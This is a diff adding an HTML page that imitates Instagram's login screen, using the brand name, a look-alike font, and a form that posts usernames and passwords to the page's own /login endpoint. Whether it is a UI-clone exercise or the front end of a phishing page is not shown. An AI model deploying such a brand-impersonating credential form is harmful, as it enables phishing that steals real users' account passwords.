@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/static/style.css">
+    <title>Instagram Login</title>
+
+    <!-- Similar handwritten font (legal alternative to Billabong) -->
+    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+
+    <!-- Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+<div class="bg-gradient">
+
+    <div class="login-card">
+        
+        <h1 class="insta-logo">Instagram</h1>
+
+        <form action="/login" method="POST">
+
+            <div class="input-box">
+                <input type="text" name="username" placeholder="Phone number, username or email address" required>
+            </div>
+
+            <div class="input-box">
+                <input type="password" name="password" placeholder="Password" required>
+                <i class="fa-solid fa-eye-slash"></i>
+            </div>
+
+            <a href="#" class="forgot-link">Forgotten password?</a>
+
+            <button type="submit" class="login-btn">Log In</button>
+
+        </form>
+
+        <div class="divider">
+            <span></span>
+            <p>OR</p>
+            <span></span>
+        </div>
+
+        <a href="#" class="fb-login">
+            <i class="fa-brands fa-facebook"></i>
+            Log in with Facebook
+        </a>
+
+    </div>
+
+    <div class="signup-card">
+        <p>Don’t have an account? <a href="#">Sign Up</a></p>
+    </div>
+
+</div>
+
+</body>
+</html>
